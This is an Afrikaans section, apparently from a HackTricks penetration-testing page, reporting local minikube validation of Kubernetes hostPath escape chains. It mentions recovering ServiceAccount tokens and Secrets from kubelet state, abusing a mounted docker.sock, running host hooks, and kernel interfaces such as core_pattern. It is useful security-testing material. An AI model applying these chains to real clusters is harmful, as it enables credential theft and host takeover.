## Plaaslike valideringstatus

Die praktiese kettings op hierdie bladsy is teen ’n plaaslike Linux minikube-node getoets. Die validering het die volgende gereproduseer:

- lees- en skryftoegang deur ’n tydelike skryfbare hostPath
- opsporing van geprojekteerde ServiceAccount-tokens en gemonteerde Secrets deur `/var/lib/kubelet/pods`
- suksesvolle Kubernetes API-verifikasie met ’n geldige token wat uit daardie gemonteerde kubelet-status herwin is
- leesalleen-opsporing van ’n naburige Docker `overlay2`-lêerstelsel deur ’n gemonteerde `/var`
- Docker API-skepping van ’n sustercontainer met ’n leesalleen-host-bind deur ’n gemonteerde `docker.sock`
- vertraagde host-uitvoering deur ’n tydelike hook wat deur die host verwerk word
- ’n CNI-wrapper-simulasie wat die oorspronklike inprop se argumente, standaardinvoer en uitvoering behou het

Dieselfde node het `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` en `config.gz` blootgestel, maar nie `uevent_helper`, EFI-veranderlikes, termiese inskrywings of `sched_debug` nie. Vernietigende kernel-snellers is nie uitgevoer nie. Dit bevestig dat host-root-, `/var`-, kubelet-status-, sok- en host-verbruikerkettings herhaalbaar is, terwyl procfs-/sysfs-hulptegnieke afhanklik moet bly van die presiese kernel, mount-modus, loonvragpad en sneller.

## References

- [1] [Plaaslike lêers en paaie wat deur die Kubelet gebruik word](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Die cilium-agent-container kan via ’n `hostPath`-mount toegang tot die host kry](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
